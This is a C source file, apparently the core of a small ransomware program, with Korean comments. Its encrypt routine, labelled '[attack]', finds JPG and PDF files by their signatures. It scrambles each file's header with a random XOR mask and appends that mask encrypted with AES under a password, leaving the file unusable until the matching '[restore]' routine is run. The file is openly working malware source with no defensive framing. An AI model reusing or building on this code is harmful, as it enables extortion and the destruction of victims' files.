#include <openssl/aes.h>  
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include "crypto.h"

#define BLOCK_SIZE 16

unsigned char SIG_JPG[] = {0xff, 0xd8, 0xff, 0xe1}; // jpg 시그니처
unsigned char SIG_PDF[] = {0x25, 0x50, 0x44, 0x46}; // pdf 시그니처

void dump_hex(char *label, unsigned char buf[], int size)
{
    printf("%s", label);

    for(int i = 0; i < size; i++)
        printf("%02X", buf[i]);

    printf("\n"); 
}

void aes_128_encrypt(PINFO param)
{ 
    AES_KEY key;
    srand(time(NULL));
    int count = 0;

    for (int i = 0; i < param -> sum; i++)
    {
        printf("[attack] %s\n", param -> fileName[i]);

        unsigned char plaintext[BLOCK_SIZE + 1] = {0, };
        fread(plaintext, 16, 1, param -> fpArr[i]);

        if (memcmp(plaintext, SIG_JPG, 4) != 0 && memcmp(plaintext, SIG_PDF, 4) != 0)
            continue;

        fseek(param -> fpArr[i], 0, SEEK_SET);

        unsigned char mask[BLOCK_SIZE + 1] = {0, };
        unsigned char encrypted_mask[BLOCK_SIZE + 1] = {0, };
        unsigned char ciphertext[BLOCK_SIZE + 1];

        for (int j = 0; j < BLOCK_SIZE; j++)
        {
            mask[j] = rand() % 256;
            ciphertext[j] = mask[j] ^ plaintext[j];
        }
        
        fwrite(ciphertext, 16, 1, param -> fpArr[i]);

        unsigned char init_key[BLOCK_SIZE] = {0, };

        memcpy(init_key, param -> password, 16);

        if(AES_set_encrypt_key(init_key, sizeof(init_key)*8, &key) < 0){
         return ;   
        };

        AES_encrypt(mask, encrypted_mask, &key);

        fseek(param -> fpArr[i], 0, SEEK_END);

        fwrite(encrypted_mask, 16, 1, param -> fpArr[i]);

        count++;
    }

    param -> sum = count; 
}


void aes_128_decrypt(PINFO param)
{
    AES_KEY key;
    int count = 0;
    int f_size = 0;

    for (int i = 0; i < param -> sum; i++)
    {
        printf("[restore] %s\n", param -> fileName[i]);

        unsigned char ciphertext[BLOCK_SIZE + 1] = {0, };
        fread(ciphertext, 16, 1, param -> fpArr[i]);
        
        if (memcmp(ciphertext, SIG_JPG, 4) == 0 || memcmp(ciphertext, SIG_PDF, 4) == 0)
            continue;
        
        fseek(param -> fpArr[i], -16, SEEK_END);

        unsigned char encrypted_mask[BLOCK_SIZE + 1] = {0, };
        fread(encrypted_mask, 16, 1, param -> fpArr[i]);
        
        unsigned char mask[BLOCK_SIZE + 1] = {0, };
        
        unsigned char init_key[BLOCK_SIZE] = {0, };

        unsigned char plaintext[BLOCK_SIZE + 1] = {0, };

        memcpy(init_key, param -> password, 16);

        
        if(AES_set_decrypt_key(init_key, sizeof(init_key)*8, &key) < 0){
        	return ;   
        }; 
        //AES 복호화 : 암호문, 평문, 키 
        
        AES_decrypt(encrypted_mask, mask, &key);

        for (int j = 0; j < BLOCK_SIZE; j++)
        {
            plaintext[j] = mask[j] ^ ciphertext[j];
        }

        if (memcmp(plaintext, SIG_JPG, 4) != 0 && memcmp(plaintext, SIG_PDF, 4) != 0)
        {
            printf("[%s] password error\n", param -> SIG + 1);
            break;
        }

        fseek(param -> fpArr[i], 0, SEEK_SET);
        fwrite(plaintext, 16, 1, param -> fpArr[i]);
        
        fseek(param -> fpArr[i], -16, SEEK_END);

        for (int j = 0; j < 16; j++)
        {
            fputc(0, param -> fpArr[i]);
        }

        count++;
    }

    param -> sum = count; 
}